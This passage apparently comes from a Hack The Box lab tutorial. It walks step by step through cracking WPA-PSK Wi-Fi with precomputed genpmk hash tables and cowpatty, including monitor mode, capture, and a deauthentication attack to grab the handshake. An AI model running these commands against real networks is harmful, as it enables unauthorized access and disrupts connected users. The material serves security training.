We can accelerate WPA-PSK cracking by performing a precomputation attack using [genpmk](https://github.com/joswr1ght/cowpatty/blob/master/genpmk.1). This tool generates a hash file by precomputing the Pairwise Master Keys (PMKs) from a given wordlist and the target Wi-Fi network's SSID.
### Planning The Attack

```sh
3kjS@htb[/htb]$ genpmk -f [wordlist] -d [output_file] -s [SSID]
```

- `-f`: Path to the wordlist (e.g., rockyou.txt)
- `-d`: Output file to store the precomputed PMKs
- `-s`: Target SSID of the Wi-Fi network

Then, we'll use `cowpatty` to match captured handshakes against this `table`.

```sh
3kjS@htb[/htb]$ cowpatty -d [output_file] -r [capture.pcap] -s [SSID]
```

- `-d`: Precomputed hash file generated by genpmk
- `-r`: Packet capture file containing the 4-way handshake
- `-s`: Same SSID used in the genpmk step
### Performing The Attack

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```sh
3kjS@htb[/htb]$ sudo airmon-ng start wlan0
```

Once our interface is in monitor mode, we use `airodump-ng` to scan for available Wi-Fi networks and their associated clients. Additionally, we use the option `-w WPA` to save the output of the scan into a file.

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WPA
```

We note the target SSID `HackTheBox`, then generate a precomputed PMK hash table for it using `genpmk`. The `-f` option specifies the wordlist, and `-d` defines the output file for the generated hashes.

```sh
3kjS@htb[/htb]$ genpmk -f /opt/rockyou.txt -d /tmp/hashtable -s HackTheBox
```

Next, we execute a deauthentication attack on connected client using `aireplay-ng`. This forces them to reconnect to the access point, which allows us to capture the 4-way handshake.

```sh
3kjS@htb[/htb]$ aireplay-ng -0 5 -a 80:2D:BF:FE:13:83 -c 8A:00:A9:9B:ED:1A wlan0mon
```

Once the handshake has been captured, we use `cowpatty` to match captured handshake against the generated hash table.

```sh
3kjS@htb[/htb]$ cowpatty -d /tmp/hashtable -r WPA-01.cap -s HackTheBox
```
